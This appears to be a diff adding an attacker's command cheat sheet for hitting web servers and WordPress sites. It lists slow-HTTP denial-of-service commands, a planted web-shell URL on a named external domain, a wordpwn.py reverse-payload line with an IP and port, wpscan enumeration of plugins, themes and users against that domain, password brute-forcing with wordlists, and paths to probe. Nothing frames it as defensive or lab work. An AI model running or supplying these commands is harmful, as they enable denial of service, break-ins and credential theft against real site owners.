@@ -1,0 +1,22 @@
+python slowdeath.py -t 200 http://192.168.56.101
+apt-get install slowhttptest
+slowhttptest -H -u http://10.0.0.27
+slowhttptest -H -c 1000 -H -i 10 -r 200 -t GET -x 24 -p 3 -u http://10.0.0.27
+slowhttptest -B -u http://10.0.0.27
+
+http://morelli.co.id/wp-content/plugins/shell/shell.php
+wordpwn.py 103.77.78.230 8888 Y
+
+nmap -sV --script http-wordpress-enum --script-args limit=25
+wpscan --url http://morelli.co.id --enumerate vp
+wpscan --url http://morelli.co.id --enumerate vt
+wpscan --url http://morelli.co.id --enumerate u
+wpscan --url http://morelli.co.id --wordlist apache.txt threads 50
+wpscan -u 192.241.xx.x68 --threads 20 --passwordlist 500worst.txt --username testadmin
+
+/wp-content/
+/wp-content/plugins/
+/wp-content/themes/
+/uploads/
+/images/
+/?author=1.2.3
